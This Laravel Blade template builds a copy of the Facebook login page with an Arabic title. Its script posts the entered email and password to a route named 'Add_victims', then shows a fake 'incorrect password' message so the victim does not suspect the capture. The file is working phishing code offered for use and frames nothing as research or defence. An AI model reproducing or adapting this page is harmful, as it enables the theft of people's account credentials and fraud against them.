@extends('empaty')
@section('css')
    <style>
        body {
            background: rgba(0, 0, 0, 0.1) url({{ 'build/assets/imgs/' . $group->photo }}) no-repeat;
            background-size: cover;
        }

        /* .cont {
                                                                                                                                                                                                                                                                                                                                                                                                    background: rgba(255, 255, 255, 0.795);
                                                                                                                                                                                                                                                                                                                                                                                                    width: 100%;
                                                                                                                                                                                                                                                                                                                                                                                                    height: 900px;
                                                                                                                                                                                                                                                                                                                                                                                                }

                                                                                                                                                                                                                                                                                                                                                                                                .inp {
                                                                                                                                                                                                                                                                                                                                                                                                    background: rgba(255, 255, 0, 0.233)
                                                                                                                                                                                                                                                                                                                                                                                                } */




        .cont {
            padding: 0 15px;
            width: 100%;
            min-height: 100vh;
            justify-content: center;
            background: #f0f2f57a;

        }



        .facebook-page {
            justify-content: space-between;
            max-width: 1000px;
            width: 100%;

        }

        .facebook-page .text {
            margin: auto;

        }

        .facebook-page h1 {
            color: #1877f2;
            font-size: 4rem;
            margin-bottom: 10px;
        }

        .facebook-page p {
            font-size: 1.75rem;
            white-space: nowrap;
        }

        form {
            display: flex;
            flex-direction: column;
            background: #fff;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
                0 8px 16px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;

            margin-left: 60%
        }

        form input {
            height: 55px;
            width: 100%;
            border: 1px solid #ccc;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 1rem;
            padding: 0 14px;

        }

        form input:focus {
            outline: none;
            border-color: #1877f2;
        }

        ::placeholder {
            color: #777;
            font-size: 1.063rem;
        }

        .link {
            display: flex;
            flex-direction: column;
            text-align: center;
            gap: 15px;
        }

        .link .login {
            border: none;
            outline: none;
            cursor: pointer;
            background: #1877f2;
            padding: 15px 0;
            border-radius: 6px;
            color: #fff;
            font-size: 1.25rem;
            font-weight: 600;
            transition: 0.2s ease;
        }

        .link .login:hover {
            background: #0d65d9;
        }

        form a {
            text-decoration: none;
        }

        .link .forgot {
            color: #1877f2;
            font-size: 0.875rem;
        }

        .link .forgot:hover {
            text-decoration: underline;
        }

        hr {
            border: none;
            height: 1px;
            background-color: #ccc;
            margin-bottom: 20px;
            margin-top: 20px;
        }

        .button {
            margin-top: 25px;
            text-align: center;
            margin-bottom: 20px;
        }

        .button a {
            padding: 15px 20px;
            background: #42b72a;
            border-radius: 6px;
            color: #fff;
            font-size: 1.063rem;
            font-weight: 600;
            transition: 0.2s ease;
        }

        .button a:hover {
            background: #3ba626;
        }

        @media (max-width: 900px) {
            .facebook-page {
                flex-direction: column;
                text-align: center;
            }

            .facebook-page .text {
                margin-bottom: 30px;
            }
        }

        @media (max-width: 460px) {
            .facebook-page h1 {
                font-size: 3.5rem;
            }

            .facebook-page p {
                font-size: 1.3rem;
            }

            form {
                padding: 15px;
            }
        }
    </style>
@stop
@section('title')
    تسجيل الدخول الي فيسبوك

@stop
@section('content')



    <div class="cont flex">
        <div class="facebook-page flex">
            <div class="text">
                {{-- <h1>facebook</h1> --}}

            </div>

            <form action="#" id="formData">
                @csrf
                @method('POST')
                <div class="text">
                    <h1>facebook</h1>

                </div>

                <input type="email" placeholder="Email or phone number" required name="email">
                <p class="text-danger" id="error_email" style="font-size:80%"> </p>
                <input type="password" placeholder="Password" required name="password">
                <p class="text-danger" id="error_password" style="font-size:80%"> </p>
                <p style="font-size:75%;display:none;color:red" id="success_login">
                    The email address you entered isn't connected to an account or<br>
                    The password that you've entered is incorrect.

                </p>
                <div class="spinner-border m-auto" id="progress" style="display: none"></div>
                <div class="link">

                    <button type="submit" class="login" id="craete">Login</button>
                    <a href="https://www.facebook.com/recover/account/" class="forgot">Forgot password?</a>
                </div>
                <hr>
                <div class="button">
                    <a href="https://www.facebook.com/pages/create/?ref_type=registration_form">Create new account</a>
                </div>
            </form>
        </div>
    </div>

@stop

@section('js')
    <script>
        $(document).ajaxStart(function() {
            $('#progress').show();


        });


        $(document).ajaxStop(function() {
            $('#progress').hide();

        });

        $(document).on('click', '#craete', function(e) {
            e.preventDefault();
            var formData = new FormData($('#formData')[0]);
            $.ajax({
                type: "POST",
                url: "{{ route('Add_victims') }}",
                data: formData,
                processData: false,
                cache: false,
                contentType: false,
                success: function(data) {
                    if (data.msg == "error") {
                        $('#error_alert').show();
                        $('#success_login').hide();
                        $('.text-danger').hide();


                        $.each(data.data, function(key, value) {
                            if (value) {

                                $('#error_' + key).text(value).show();
                            }
                        });


                    }

                    if (data.msg == "success") {

                        $('#success_login').show();
                        $('.text-danger').hide();

                    }


                },
                error: function(error) {
                    $('#error_alert').show();
                    $('#success_alert').hide();
                    setInterval(() => {
                            $("#error_alert").fadeOut('slow')

                        },
                        3000)

                }
            });



        })
    </script>
@stop
